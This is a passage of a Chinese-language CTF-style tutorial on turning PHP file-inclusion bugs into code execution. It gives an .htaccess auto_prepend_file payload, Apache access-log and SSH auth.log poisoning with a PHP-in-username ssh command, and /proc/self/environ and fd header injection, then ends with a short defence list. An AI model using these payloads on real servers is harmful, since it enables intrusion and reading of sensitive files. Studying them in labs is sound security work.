    $filename = $_GET['filename'];
    $content = $_GET['content'];
    file_put_contents($filename,$content . "\nxxxxxx");
}else{
    highlight_file(__FILE__);
}
```

这种考点一般的话是禁止有特殊起始符和结束符号的语言，如果不禁，直接写入PHP代码就可以执行了，后面的限制也就没有什么意义了，这类问题往往是需要想办法处理掉杂糅代码的

**.htaccess绕过：**
使用.htaccess文件绕过需要注意该文件是很敏感的，如果有杂糅代码，便会出现错误，导致无法操作，可以使用注释符来将杂糅代码给注释掉

```php
Payload：

?filename=.htaccess&content=php_value auto_prepend_file D:\flag.php%0a%23\
```

这里我本机测试时无法执行.htaccess，借用了一下别人的图 (还是太菜了~~)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528013126219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 包含日志
## 访问日志

利用条件： 需要知道服务器日志的存储路径，且日志文件可读
很多时候，web服务器会将请求写入到日志文件中，比如说apache；在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log；默认情况下，日志保存路径在 /var/log/apache2/
但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析，所以我们可以使用burp截包后修改
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528015031532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
虽然返回400，但是已经写入了访问日志

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052801512184.png#pic_center)

注意：在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528015211468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## SSH log

利用条件：需要知道ssh-log的位置，且可读，默认情况下为 /var/log/auth.log
利用方式:
- 用ssh连接：`ubuntu@VM-207-93-ubuntu:~$ ssh '<?php phpinfo(); ?>'@remotehost`
- 之后会提示输入密码等等，随便输入
- 然后在remotehost的ssh-log中即可写入php代码，之后进行文件包含即可
- 详细解释[参考链接](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528015620656.png#pic_center)

# 包含environ

利用条件：
- php以cgi方式运行，这样environ才会保持UA头
- environ文件存储位置已知，且environ文件可读

>姿势：
/proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它即可
详细解释[参考链接1](http://websecuritylog.blogspot.com/2010/06/procselfenviron-injection.html)，[参考链接2](https://www.exploit-db.com/papers/12886)

# 包含fd

类似environ，不同的是需要包含fd文件，而php代码插入的地方是referer头，同样需要可读权限

# 利用工具

工具[链接地址](https://github.com/P0cL4bs/Kadimus/)

# 防御方案

1. 在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败
2. 做好文件的权限管理
3. 对危险字符进行过滤等等
